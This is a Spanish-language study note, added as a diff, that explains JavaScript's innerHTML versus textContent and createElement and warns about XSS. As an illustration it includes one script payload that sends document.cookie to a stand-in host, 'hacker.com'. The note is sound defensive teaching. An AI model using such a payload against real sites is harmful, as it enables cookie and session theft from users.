@@ -1,0 +1,58 @@
+¿Qué es .innerHTML?
+Mientras que .textContent solo entiende texto plano, .innerHTML entiende código HTML. 
+Si tú le pasas una etiqueta como texto, él la renderiza (la dibuja) de verdad.
+Es una propiedad que representa el contenido HTML interno de un elemento. 
+A diferencia de textContent, que solo maneja letras, innerHTML permite leer o escribir 
+etiquetas dentro de un objeto.
+
+La diferencia visual:
+Si usas textContent = "<b>Hola</b>", verás en la pantalla las etiquetas escritas: <b>Hola</b>.
+Si usas innerHTML = "<b>Hola</b>", verás la palabra Hola en negrita.
+
+¿Por qué dije "usar con cuidado"? ⚠️
+Se debe usar con precaución por dos motivos:
+    -> Seguridad: Si dejas que un usuario escriba algo y lo metes directamente con innerHTML, 
+       podría meter código malicioso (scripts).
+    -> Rendimiento: Cada vez que usas innerHTML, el navegador tiene que borrar todo lo que 
+       había dentro de ese elemento y volver a dibujarlo de cero.
+
+¿Cuándo se usa? (Los casos buenos)
+Se usa principalmente cuando tienes que generar grandes bloques de HTML de forma rápida y 
+el contenido es "estático" (tú lo controlas, no viene de lo que escribe un usuario).
+
+    -> Plantillas rápidas: Si tienes que crear una tarjeta de usuario con una imagen, 
+       un nombre y un enlace, es más rápido escribir un string con innerHTML que crear 
+       4 etiquetas con createElement.
+    -> Limpiar contenido: Una forma muy común de vaciar un div o una lista es hacer: 
+       elemento.innerHTML = "";.
+
+¿Por qué se dice que es "peligroso"? (XSS)
+El peligro tiene un nombre técnico: XSS (Cross-Site Scripting).
+
+Si tú tienes un buscador y el código hace esto: 
+resultados.innerHTML = "Resultados para: " + inputUsuario.value;
+
+Un hacker podría escribir en el input un código como este: 
+<script>fetch('http://hacker.com?cookie=' + document.cookie)</script>
+
+Al usar innerHTML, el navegador ejecutaría ese código, 
+permitiendo al hacker robar datos. Con textContent, 
+esto no pasaría porque el navegador simplemente escribiría 
+el texto en pantalla sin ejecutarlo.
+
+Entonces, ¿por qué se sigue usando?
+Se sigue usando por tres razones principales:
+
+     -> Velocidad de desarrollo: Escribir div.innerHTML = "<p>Hola</p>" es mucho más 
+        corto que hacer el proceso de 3 pasos de createElement.
+     -> Comodidad: Permite ver la estructura del HTML directamente en el código JavaScript, 
+        lo cual es más fácil de leer para humanos.
+     -> Seguridad controlada: Si el contenido que vas a meter lo has escrito tú y no viene 
+        de un input de un usuario desconocido, es totalmente seguro.
+
+⚖️ Comparativa Final: ¿Cuál elijo?
+Situación                                                    Método recomendado
+Solo quieres cambiar letras (nombres, precios)               textContent
+Quieres fabricar un elemento para luego darle eventos        createElement
+Quieres meter un fragmento de HTML que tú has diseñado       innerHTML
+El contenido viene de lo que escribió un usuario             ¡NUNCA innerHTML! Usa textContent
